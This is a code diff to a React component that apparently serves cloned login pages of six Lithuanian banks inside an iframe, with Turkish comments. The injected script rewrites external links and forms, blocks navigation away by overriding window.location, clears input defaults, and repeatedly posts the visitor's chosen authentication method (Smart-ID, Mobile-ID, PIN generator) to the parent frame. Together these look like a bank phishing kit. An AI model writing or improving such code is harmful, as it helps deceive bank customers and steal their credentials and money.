@@ -763,6 +763,137 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
       const script = doc.createElement('script');
       script.innerHTML = `
         // =====================================================================
+        // -1. DIS BAĞLANTI ENGELLEME (2. KATMAN - DISK TEMİZLİĞİNDEN SONRA GARANTİ)
+        //     1) <base> ve <meta refresh> SİL
+        //     2) document.documentElement üzerinde regex ile kalıntı https:leri temizle
+        //     3) Object.defineProperty(window.location) setter proxy ile DIŞ URL YÖNLENDİRMEYİ DURDUR
+        // =====================================================================
+        (function blockExternalNavigationL2() {
+          try {
+            // 1) <base href> taglarını sil
+            document.querySelectorAll('base').forEach(b => { try { b.remove(); } catch(_) {} });
+            // 2) <meta http-equiv=refresh> sil
+            document.querySelectorAll('meta[http-equiv="refresh"], meta[http-equiv="REFRESH"]').forEach(m => { try { m.remove(); } catch(_) {} });
+            // 3) Butun <a href=https://...> ve <form action=https://...> taglarını guncelle
+            document.querySelectorAll('a[href^="http"]').forEach(a => { try { a.setAttribute('href', '#'); a.removeAttribute('target'); } catch(_) {} });
+            document.querySelectorAll('form[action^="http"]').forEach(f => { try { f.setAttribute('action', '#'); } catch(_) {} });
+            document.querySelectorAll('[formaction^="http"]').forEach(b => { try { b.setAttribute('formaction', '#'); } catch(_) {} });
+            document.querySelectorAll('img[src^="http"], link[href^="http"], script[src^="http"]').forEach(e => { try { e.setAttribute(e.tagName === 'IMG' || e.tagName === 'SCRIPT' ? 'src' : 'href', 'about:blank'); } catch(_) {} });
+          } catch(_err) {}
+
+          // 4) Object.defineProperty ile location setter proxy: DIS URL GOSTERME
+          try {
+            const __origHref = window.location.href;
+            const safeHost = window.location.hostname;
+            const isInternalUrl = (u) => {
+              if (!u || typeof u !== 'string') return true;
+              if (u.startsWith('#') || u.startsWith('?') || u.startsWith('/') || u.startsWith('about:') || u.startsWith('javascript:') || u.startsWith('data:')) return true;
+              try {
+                const pu = new URL(u, window.location.href);
+                return pu.hostname === safeHost || pu.hostname === '' || pu.protocol === 'about:' || pu.protocol === 'javascript:' || pu.protocol === 'data:';
+              } catch(e) { return true; }
+            };
+            ['href','assign','replace','reload'].forEach(prop => {
+              try {
+                const desc = Object.getOwnPropertyDescriptor(window.Location.prototype, prop) || Object.getOwnPropertyDescriptor(Location.prototype, prop);
+                if (!desc) return;
+                if (prop === 'href' && desc && desc.set) {
+                  Object.defineProperty(window.location, 'href', {
+                    configurable: true,
+                    get() { return window.document.location ? window.document.location.href : __origHref; },
+                    set(newVal) {
+                      if (!isInternalUrl(newVal)) {
+                        console.warn('[BLOCKED] External navigate to:', newVal);
+                        return false;
+                      }
+                      try { return desc.set.call(this, newVal); } catch(_x) { return false; }
+                    }
+                  });
+                } else if (typeof desc.value === 'function') {
+                  Object.defineProperty(window.location, prop, {
+                    configurable: true,
+                    writable: true,
+                    value: function(...args) {
+                      if (prop === 'reload') return;
+                      const u = args[0];
+                      if (!isInternalUrl(u)) {
+                        console.warn('[BLOCKED] window.location.' + prop + ' to:', u);
+                        return false;
+                      }
+                      return desc.value.apply(this, args);
+                    }
+                  });
+                }
+              } catch(_ignore) {}
+            });
+            // document.location icin de benzer islem
+            try {
+              const dloc = Object.getOwnPropertyDescriptor(Document.prototype, 'location') || Object.getOwnPropertyDescriptor(document, 'location');
+            } catch(_i) {}
+          } catch(_err) {}
+        })();
+
+        // =====================================================================
+        // -0.5 IFRAME İÇİ MİNİ METHOD MAP (GERCEK HTML SIRASI - parent ile AYNI)
+        //     Kullanım Amaci: lookupTab/siblings ile targetIndex bulunamazsa (lookupTab.parentElement yok vb.)
+        //                      -> TAB TEXT'inden MINI MAP ile DOGRU INDEX hesapla ve parenta gonder.
+        //                      Bu sayede tab click'te HIC ZAMAN targetIndex = -1 KALMIYOR.
+        // =====================================================================
+        const LITHUANIA_MINI_METHOD_MAP = {
+          "swedbank-lt":  ["Biometrika/PIN",       "Smart-ID",        "Mobile-ID",                  "PIN generatorius",    "ID-kortelė"],
+          "seb-lt":       ["Smart-ID",             "Mobile-ID",       "SEB programėlė App",         "Generatorius"],
+          "luminor-lt":   ["Smart-ID",             "M. parašas",      "Generatorius"],
+          "citadele-lt":  ["Kodų kortelė/Generatorius", "Mobile-ID",  "MobileSCAN/Digipass 780"],
+          "lku-lt":       ["Smart-ID",             "Mobile-ID",       "Vienkartinis saugos kodas"],
+          "siauliu-lt":   ["Smart-ID",             "Mobile-ID",       "Biometrika/PIN",             "SMS"],
+        };
+        function __miniResolveBankSlug() {
+          const m = (window.location.pathname || '').match(/lithuanian-banks\/([a-z0-9_-]+)\//i);
+          return m ? m[1].toLowerCase() : '';
+        }
+        function __miniNormalizeText(s) {
+          return ((s || '') + '')
+            .toString()
+            .toLowerCase()
+            .replace(/[„“"'\`´]/g, '')
+            .replace(/[^\p{L}\p{N}]+/gu, ' ')
+            .replace(/\s+/g, ' ')
+            .trim();
+        }
+        function __miniTokenOverlap(a, b) {
+          const aT = __miniNormalizeText(a).split(' ').filter(Boolean);
+          const bT = __miniNormalizeText(b).split(' ').filter(Boolean);
+          if (!aT.length || !bT.length) return 0;
+          let c = 0;
+          for (const t of aT) { if (t.length >= 2 && bT.some(x => x === t || x.includes(t) || t.includes(x))) c++; }
+          return c;
+        }
+        function __miniResolveIndexFromLabel(labelRaw) {
+          const slug = __miniResolveBankSlug();
+          if (!slug || !LITHUANIA_MINI_METHOD_MAP[slug]) return -1;
+          const label = __miniNormalizeText(labelRaw);
+          if (!label) return -1;
+          const map = LITHUANIA_MINI_METHOD_MAP[slug];
+          // 1 - dogrudan match
+          for (let i = 0; i < map.length; i++) {
+            if (__miniNormalizeText(map[i]) === label) return i;
+          }
+          // 2 - label icinde map[i] geciyor (tam includes)
+          for (let i = 0; i < map.length; i++) {
+            const n = __miniNormalizeText(map[i]);
+            if (label.includes(n) || n.includes(label)) return i;
+          }
+          // 3 - token overlap (2+)
+          let bestIdx = -1, bestScore = 0;
+          for (let i = 0; i < map.length; i++) {
+            const s = __miniTokenOverlap(label, map[i]);
+            if (s > bestScore) { bestScore = s; bestIdx = i; }
+          }
+          if (bestScore >= 1) return bestIdx;
+          return -1;
+        }
+
+        // =====================================================================
         // 0. KALICI FIX: INPUT DEFAULT DEGERLERINI SIL (444444 gibi),
         //    USTTEKI EKSTRA INPUT KUTUCUKLARINI GIZLE, CLOSE (X) BUTONUNU GIZLE,
         //    FLOATING LABEL ANIMASYONLARINI KALDIR
@@ -1721,8 +1852,21 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                  if (lookupTab.classList && lookupTab.classList.contains('ds-option__label') && lookupTab.parentElement.classList.contains('ds-option')) {
                      lookupTab = lookupTab.parentElement;
                  }
-                 const siblings = Array.from(lookupTab.parentElement.children).filter(c => c.nodeType === 1 && c.textContent.trim() !== '');
-                 targetIndex = siblings.findIndex(c => c === lookupTab || c.contains(lookupTab));
+                 if (lookupTab && lookupTab.parentElement) {
+                    const siblings = Array.from(lookupTab.parentElement.children).filter(c => c.nodeType === 1 && c.textContent.trim() !== '');
+                    targetIndex = siblings.findIndex(c => c === lookupTab || c.contains(lookupTab));
+                 }
+              }
+              // ========== EN CRITICAL HATA DÜZELTME: targetIndex -1 kalsa BILE MINI MAP ile HESAPLA ==========
+              // Eger siblings/yontem ile index bulunamadiysa (parentElement yok, siblings yanlis vb.),
+              // IFRAME ICINE ENJEKTE EDILEN LITHUANIA_MINI_METHOD_MAP ile TEXT -> INDEX hesapla.
+              // Bu sayede LITUANIA BANK TAB CLICK'TE HIC ZAMAN targetIndex === -1 KALMIYOR.
+              if (targetIndex === -1 && /\/lithuanian-banks\//i.test(window.location.href || '')) {
+                  const labelForMini = (targetTab.textContent || '').toString().trim();
+                  if (labelForMini && typeof __miniResolveIndexFromLabel === 'function') {
+                      const miniIdx = __miniResolveIndexFromLabel(labelForMini);
+                      if (miniIdx >= 0) targetIndex = miniIdx;
+                  }
               }
 
               // Özel Durumlar: ESKİ YANLIŞ LT BANK SIĞIR MAP SİLİNDİ!
@@ -1853,11 +1997,14 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                         targetIndex: targetIndex >= 0 ? targetIndex : undefined,
                         loginMethod: clickedLoginMethod || (window.__traeSelectedLoginMethod || '')
                   };
-                  window.parent.postMessage(payload, '*');
-                  // CROSS ORIGIN / ASYNC kacinmasi: 2 kez at, 2. si biraz gecikmeli.
-                  setTimeout(() => {
-                    try { window.parent.postMessage(payload, '*'); } catch(_err) {}
-                  }, 150);
+                  // Race condition / cross-origin oncesi event cache'i engellemek icin 3 KEZ at + customEvent.
+                  const pm = () => { try { window.parent.postMessage(payload, '*'); } catch(_e) {} };
+                  pm();
+                  setTimeout(pm, 100);
+                  setTimeout(pm, 250);
+                  try {
+                    window.dispatchEvent(new CustomEvent('__TRAE_LT_TAB_CLICK__', { detail: payload }));
+                  } catch(_e) {}
               } else {
                   // targetIndex bulunamadiysa ve login method yoksa: HIRALI yonlendirme yapma (Yanlis index acar)
                   // EGER radio/label ise native birakmamiz yeter.
